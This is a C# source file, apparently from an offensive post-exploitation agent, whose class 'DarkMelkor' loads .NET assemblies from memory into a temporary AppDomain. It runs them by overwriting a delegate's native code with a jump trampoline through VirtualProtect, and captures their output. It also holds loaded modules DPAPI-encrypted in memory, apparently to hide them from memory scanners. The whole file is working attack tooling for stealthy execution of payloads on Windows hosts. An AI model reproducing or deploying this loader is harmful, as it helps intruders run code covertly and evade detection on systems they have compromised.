using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace Apollo.Utils
{
    class DarkMelkor
    {
        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        // API
        //======================
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtFreeVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            AllocationType FreeType);

        [DllImport("ntdll.dll")]
        public static extern void RtlZeroMemory(
            IntPtr Destination,
            int length);

        [DllImport("kernel32.dll")]
        public static extern IntPtr LocalFree(
            IntPtr hMem);

        [DllImport("crypt32.dll", CharSet = CharSet.Auto)]
        public static extern bool CryptProtectData(
            ref DATA_BLOB pPlainText,
            string szDescription,
            ref DATA_BLOB pEntropy,
            IntPtr pReserved,
            IntPtr pPrompt,
            int dwFlags,
            ref DATA_BLOB pCipherText);

        [DllImport("crypt32.dll", CharSet = CharSet.Auto)]
        public static extern bool CryptUnprotectData(
            ref DATA_BLOB pCipherText,
            ref string pszDescription,
            ref DATA_BLOB pEntropy,
            IntPtr pReserved,
            IntPtr pPrompt,
            int dwFlags,
            ref DATA_BLOB pPlainText);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct DPAPI_MODULE
        {
            public String sModName;
            public int iModVersion;
            public int iModSize;
            public IntPtr pMod;
            public Byte[] bMod;
        }

        [Flags]
        public enum AllocationType : uint
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            ResetUndo = 0x1000000,
            LargePages = 0x20000000
        }

        // Globals
        //======================
        public static Byte[] bEntropy = { 0x90, 0x91, 0x92, 0x93 }; // Add entropy to the crypto
        public static int CRYPTPROTECT_LOCAL_MACHINE = 0x4;
        public static Object CryptLock = new Object();

        public static string loadAppDomainModule(String[] sParams, Byte[] bMod)
        {
            string result = "";
            var bytes = bMod;
            AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
            isolationDomain.SetData("str", sParams);
            bool default_domain = AppDomain.CurrentDomain.IsDefaultAppDomain();
            try
            {
                isolationDomain.Load(bMod);
            }
            catch { }
            var Sleeve = new CrossAppDomainDelegate(Console.Beep);
            var Ace = new CrossAppDomainDelegate(ActivateLoader);

            RuntimeHelpers.PrepareDelegate(Sleeve);
            RuntimeHelpers.PrepareDelegate(Ace);

            var flags = BindingFlags.Instance | BindingFlags.NonPublic;
            var codeSleeve = (IntPtr)Sleeve.GetType().GetField("_methodPtrAux", flags).GetValue(Sleeve);
            var codeAce = (IntPtr)Ace.GetType().GetField("_methodPtrAux", flags).GetValue(Ace);

            int[] patch = new int[3];

            patch[0] = 10;
            patch[1] = 11;
            patch[2] = 12;

            uint oldprotect = 0;
            VirtualProtect(codeSleeve, new UIntPtr((uint)patch[2]), 0x4, out oldprotect);
            Marshal.WriteByte(codeSleeve, 0x48);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
            Marshal.WriteIntPtr(IntPtr.Add(codeSleeve, 2), codeAce);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[0]), 0xff);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);
            VirtualProtect(codeSleeve, new UIntPtr((uint)patch[2]), oldprotect, out oldprotect);
            try
            {
                isolationDomain.DoCallBack(Sleeve);
            }
            catch (Exception ex)
            {
            }
            string str = isolationDomain.GetData("str") as string;
            result = str;
            unloadAppDomain(isolationDomain);
            return result;
        }

        static void ActivateLoader()
        {
            string[] str = AppDomain.CurrentDomain.GetData("str") as string[];
            string output = "";
            foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (!asm.FullName.Contains("mscor"))
                {
                    TextWriter realStdOut = Console.Out;
                    TextWriter realStdErr = Console.Error;
                    TextWriter stdOutWriter = new StringWriter();
                    TextWriter stdErrWriter = new StringWriter();
                    Console.SetOut(stdOutWriter);
                    Console.SetError(stdErrWriter);
                    var result = asm.EntryPoint.Invoke(null, new object[] { str });

                    Console.Out.Flush();
                    Console.Error.Flush();
                    Console.SetOut(realStdOut);
                    Console.SetError(realStdErr);

                    output = stdOutWriter.ToString();
                    output += stdErrWriter.ToString();
                }
            }
            AppDomain.CurrentDomain.SetData("str", output);

        }

        public static void unloadAppDomain(AppDomain oDomain)
        {
            AppDomain.Unload(oDomain);
        }

        public static DATA_BLOB makeBlob(Byte[] bData)
        {
            DATA_BLOB oBlob = new DATA_BLOB();

            oBlob.pbData = Marshal.AllocHGlobal(bData.Length);
            oBlob.cbData = bData.Length;
            RtlZeroMemory(oBlob.pbData, bData.Length);
            Marshal.Copy(bData, 0, oBlob.pbData, bData.Length);

            return oBlob;
        }

        public static void freeMod(DPAPI_MODULE oMod)
        {
            //IntPtr piLen = (IntPtr)oMod.iModSize;
            //NtFreeVirtualMemory((IntPtr)(-1), ref oMod.pMod, ref piLen, AllocationType.Release);
            LocalFree(oMod.pMod);
        }

        public static DPAPI_MODULE dpapiEncryptModule(Byte[] bMod, String sModName, Int32 iModVersion = 0)
        {
            DPAPI_MODULE dpMod = new DPAPI_MODULE();

            DATA_BLOB oPlainText = makeBlob(bMod);
            DATA_BLOB oCipherText = new DATA_BLOB();
            DATA_BLOB oEntropy = makeBlob(bEntropy);

            Boolean bStatus = CryptProtectData(ref oPlainText, sModName, ref oEntropy, IntPtr.Zero, IntPtr.Zero, CRYPTPROTECT_LOCAL_MACHINE, ref oCipherText);
            if (bStatus)
            {
                dpMod.sModName = sModName;
                dpMod.iModVersion = iModVersion;
                dpMod.iModSize = oCipherText.cbData;
                dpMod.pMod = oCipherText.pbData;
            }

            return dpMod;
        }

        public static DPAPI_MODULE dpapiDecryptModule(DPAPI_MODULE oEncMod)
        {
            DPAPI_MODULE oMod = new DPAPI_MODULE();

            Byte[] bEncrypted = new Byte[oEncMod.iModSize];
            Marshal.Copy(oEncMod.pMod, bEncrypted, 0, oEncMod.iModSize);

            DATA_BLOB oPlainText = new DATA_BLOB();
            DATA_BLOB oCipherText = makeBlob(bEncrypted);
            DATA_BLOB oEntropy = makeBlob(bEntropy);

            String sDescription = String.Empty;
            Boolean bStatus = CryptUnprotectData(ref oCipherText, ref sDescription, ref oEntropy, IntPtr.Zero, IntPtr.Zero, 0, ref oPlainText);
            if (bStatus)
            {
                oMod.pMod = oPlainText.pbData;
                oMod.bMod = new Byte[oPlainText.cbData];
                Marshal.Copy(oPlainText.pbData, oMod.bMod, 0, oPlainText.cbData);
                oMod.iModSize = oPlainText.cbData;
                oMod.iModVersion = oEncMod.iModVersion;
            }

            return oMod;
        }
    }
}
